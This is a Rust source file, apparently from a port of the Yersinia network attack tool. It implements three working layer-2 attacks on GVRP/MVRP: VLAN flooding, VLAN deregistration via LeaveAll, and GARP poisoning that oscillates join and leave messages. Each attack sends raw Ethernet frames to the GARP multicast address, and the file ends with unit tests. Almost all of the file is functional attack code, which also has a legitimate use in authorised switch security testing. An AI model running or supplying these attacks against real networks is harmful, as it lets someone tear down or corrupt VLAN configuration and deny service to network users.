//! GVRP/MVRP Attack Implementations
use super::packet::{GarpAttributeEvent, GvrpPacket, MvrpPacket};
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct VlanFloodingAttack {
    pub start_vlan: u16,
    pub end_vlan: u16,
    pub use_mvrp: bool,
}

impl VlanFloodingAttack {
    pub fn new(start_vlan: u16, end_vlan: u16) -> Self {
        Self {
            start_vlan: start_vlan.clamp(1, 4094),
            end_vlan: end_vlan.clamp(1, 4094),
            use_mvrp: false,
        }
    }

    pub fn with_mvrp(mut self) -> Self {
        self.use_mvrp = true;
        self
    }

    pub fn build_gvrp_packets(&self) -> Vec<GvrpPacket> {
        let mut packets = Vec::new();

        // Register all VLANs in range
        for vlan_id in self.start_vlan..=self.end_vlan {
            let pkt = GvrpPacket::new().with_vlan_registration(vlan_id);
            packets.push(pkt);
        }

        packets
    }

    pub fn build_mvrp_packets(&self) -> Vec<MvrpPacket> {
        let mut packets = Vec::new();

        // Register all VLANs in range
        for vlan_id in self.start_vlan..=self.end_vlan {
            let pkt = MvrpPacket::new().with_vlan_registration(vlan_id);
            packets.push(pkt);
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct VlanDeregistrationAttack {
    pub target_vlans: Vec<u16>,
    pub deregister_all: bool,
}

impl VlanDeregistrationAttack {
    pub fn new(target_vlans: Vec<u16>) -> Self {
        Self {
            target_vlans,
            deregister_all: false,
        }
    }

    pub fn all_vlans() -> Self {
        Self {
            target_vlans: Vec::new(),
            deregister_all: true,
        }
    }

    pub fn build_gvrp_packets(&self) -> Vec<GvrpPacket> {
        let mut packets = Vec::new();

        if self.deregister_all {
            // Send LeaveAll to deregister everything
            packets.push(GvrpPacket::new().with_leave_all());
        } else {
            // Deregister specific VLANs
            for &vlan_id in &self.target_vlans {
                let pkt = GvrpPacket::new().with_vlan_deregistration(vlan_id);
                packets.push(pkt);
            }
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct GarpPoisoningAttack {
    pub poison_vlan: u16,
    pub oscillate: bool,
}

impl GarpPoisoningAttack {
    pub fn new(vlan_id: u16) -> Self {
        Self {
            poison_vlan: vlan_id,
            oscillate: false,
        }
    }

    pub fn with_oscillation(mut self) -> Self {
        self.oscillate = true;
        self
    }

    pub fn build_poisoning_packets(&self) -> Vec<GvrpPacket> {
        let mut packets = Vec::new();

        if self.oscillate {
            // Rapidly oscillate between Join and Leave to confuse state machines
            for _ in 0..10 {
                packets.push(GvrpPacket::new().with_vlan_registration(self.poison_vlan));
                packets.push(GvrpPacket::new().with_vlan_deregistration(self.poison_vlan));
            }
        } else {
            // Send conflicting GARP messages
            let mut pkt = GvrpPacket::new();
            pkt.attributes.push(super::packet::GvrpAttribute {
                attribute_type: super::packet::GarpAttributeType::VlanIdentifier,
                attribute_length: 2,
                event: GarpAttributeEvent::JoinEmpty,
                vlan_id: self.poison_vlan,
            });
            pkt.attributes.push(super::packet::GvrpAttribute {
                attribute_type: super::packet::GarpAttributeType::VlanIdentifier,
                attribute_length: 2,
                event: GarpAttributeEvent::LeaveEmpty,
                vlan_id: self.poison_vlan,
            });
            packets.push(pkt);
        }

        packets
    }
}

#[async_trait]
impl Attack for VlanFloodingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(50);
        let packets = if self.use_mvrp {
            self.build_mvrp_packets()
                .into_iter()
                .map(|p| p.to_bytes())
                .collect::<Vec<_>>()
        } else {
            self.build_gvrp_packets()
                .into_iter()
                .map(|p| p.to_bytes())
                .collect::<Vec<_>>()
        };

        for (idx, gvrp_bytes) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x80, 0xC2, 0x00, 0x00, 0x21]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::LLC,
                gvrp_bytes.clone(),
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            if idx % 10 == 0 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "VLAN Flooding"
    }
}

#[async_trait]
impl Attack for VlanDeregistrationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);
        let packets = self.build_gvrp_packets();

        for gvrp_packet in &packets {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let gvrp_bytes = gvrp_packet.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x80, 0xC2, 0x00, 0x00, 0x21]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::LLC,
                gvrp_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "VLAN Deregistration"
    }
}

#[async_trait]
impl Attack for GarpPoisoningAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(if self.oscillate { 50 } else { 200 });
        let packets = self.build_poisoning_packets();

        let mut idx = 0;
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let gvrp_bytes = packets[idx % packets.len()].to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x80, 0xC2, 0x00, 0x00, 0x21]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::LLC,
                gvrp_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            idx += 1;
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "GARP Poisoning"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_vlan_flooding_attack() {
        let attack = VlanFloodingAttack::new(1, 100);
        let packets = attack.build_gvrp_packets();
        assert_eq!(packets.len(), 100);
    }

    #[test]
    fn test_vlan_deregistration() {
        let attack = VlanDeregistrationAttack::new(vec![10, 20, 30]);
        let packets = attack.build_gvrp_packets();
        assert_eq!(packets.len(), 3);
    }

    #[test]
    fn test_vlan_deregistration_all() {
        let attack = VlanDeregistrationAttack::all_vlans();
        let packets = attack.build_gvrp_packets();
        assert_eq!(packets.len(), 1);
        assert_eq!(packets[0].attributes[0].event, GarpAttributeEvent::LeaveAll);
    }

    #[test]
    fn test_garp_poisoning() {
        let attack = GarpPoisoningAttack::new(100);
        let packets = attack.build_poisoning_packets();
        assert!(!packets.is_empty());
    }

    #[test]
    fn test_garp_poisoning_oscillation() {
        let attack = GarpPoisoningAttack::new(100).with_oscillation();
        let packets = attack.build_poisoning_packets();
        assert_eq!(packets.len(), 20); // 10 pairs
    }
}
